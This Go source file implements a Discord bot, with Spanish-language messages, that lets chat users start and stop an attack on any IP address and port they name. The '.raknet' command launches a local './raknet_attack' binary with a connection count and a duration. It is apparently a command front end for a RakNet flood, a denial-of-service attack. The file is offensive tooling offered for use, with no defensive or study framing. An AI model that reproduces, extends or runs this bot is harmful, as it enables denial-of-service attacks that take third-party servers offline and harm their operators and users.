package main

import (
	"fmt"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"sync"

	"github.com/bwmarrin/discordgo"
)

var (
	attackProcess *os.Process
	processMutex  sync.Mutex
	isRunning     bool
)

func main() {
	token := os.Getenv("DISCORD_BOT_TOKEN")
	if token == "" {
		fmt.Println("Error: DISCORD_BOT_TOKEN no está configurado")
		return
	}

	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		fmt.Println("Error creando Discord session:", err)
		return
	}

	dg.AddHandler(messageCreate)

	err = dg.Open()
	if err != nil {
		fmt.Println("Error abriendo conexión:", err)
		return
	}

	fmt.Println("Bot está corriendo. Presiona CTRL+C para salir.")
	<-make(chan struct{})
	dg.Close()
}

func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	if m.Author.ID == s.State.User.ID {
		return
	}

	content := strings.TrimSpace(m.Content)
	args := strings.Fields(content)

	if len(args) == 0 {
		return
	}

	switch args[0] {
	case ".raknet":
		handleRaknetCommand(s, m, args[1:])
	case ".stop":
		handleStopCommand(s, m)
	case ".help":
		handleHelpCommand(s, m)
	}
}

func handleRaknetCommand(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	processMutex.Lock()
	defer processMutex.Unlock()

	if isRunning {
		s.ChannelMessageSend(m.ChannelID, "Ya hay un ataque run")
		return
	}

	if len(args) < 4 {
		s.ChannelMessageSend(m.ChannelID, "`.raknet <ip> <puerto> <conexiones> <segundos>`")
		return
	}

	ip := args[0]
	port := args[1]
	connections := args[2]
	timeSeconds := args[3]

	if !isValidIP(ip) {
		s.ChannelMessageSend(m.ChannelID, "IP no inválida")
		return
	}

	if !isValidPort(port) {
		s.ChannelMessageSend(m.ChannelID, "Puerto no valido")
		return
	}

	if !isValidNumber(connections) {
		s.ChannelMessageSend(m.ChannelID, "Número de conexiones no valido")
		return
	}

	if !isValidNumber(timeSeconds) {
		s.ChannelMessageSend(m.ChannelID, "Segundos no valido")
		return
	}

	go func() {
		cmd := exec.Command("./raknet_attack", ip, port, connections, timeSeconds)
		
		err := cmd.Start()
		if err != nil {
			s.ChannelMessageSend(m.ChannelID, "Error raknet.go")
			return
		}

		processMutex.Lock()
		attackProcess = cmd.Process
		isRunning = true
		processMutex.Unlock()

		s.ChannelMessageSend(m.ChannelID, "Ataque iniciado")

		err = cmd.Wait()
		
		processMutex.Lock()
		isRunning = false
		attackProcess = nil
		processMutex.Unlock()

		if err != nil {
			s.ChannelMessageSend(m.ChannelID, "Error raknet.go")
		} else {
			s.ChannelMessageSend(m.ChannelID, "Ataque finalizado")
		}
	}()
}

func handleStopCommand(s *discordgo.Session, m *discordgo.MessageCreate) {
	processMutex.Lock()
	defer processMutex.Unlock()

	if !isRunning || attackProcess == nil {
		s.ChannelMessageSend(m.ChannelID, "No hay ataque run")
		return
	}

	err := attackProcess.Kill()
	if err != nil {
		s.ChannelMessageSend(m.ChannelID, "Error al detener")
		return
	}

	isRunning = false
	attackProcess = nil
	s.ChannelMessageSend(m.ChannelID, "Ataque detenido")
}

func handleHelpCommand(s *discordgo.Session, m *discordgo.MessageCreate) {
	helpMsg := "**Comandos disponibles:**\n" +
		".raknet <ip> <puerto> <conexiones> <segundos>\n" +
		".stop - Detiene los ataques\n" +
		".help - Muestra esta ayuda\n\n"

	s.ChannelMessageSend(m.ChannelID, helpMsg)
}

func isValidIP(ip string) bool {
	if ip == "localhost" {
		return true
	}
	parts := strings.Split(ip, ".")
	if len(parts) != 4 {
		return false
	}
	for _, part := range parts {
		num, err := strconv.Atoi(part)
		if err != nil || num < 0 || num > 255 {
			return false
		}
	}
	return true
}

func isValidPort(port string) bool {
	p, err := strconv.Atoi(port)
	if err != nil {
		return false
	}
	return p > 0 && p <= 65535
}

func isValidNumber(numStr string) bool {
	num, err := strconv.Atoi(numStr)
	if err != nil {
		return false
	}
	return num > 0
}
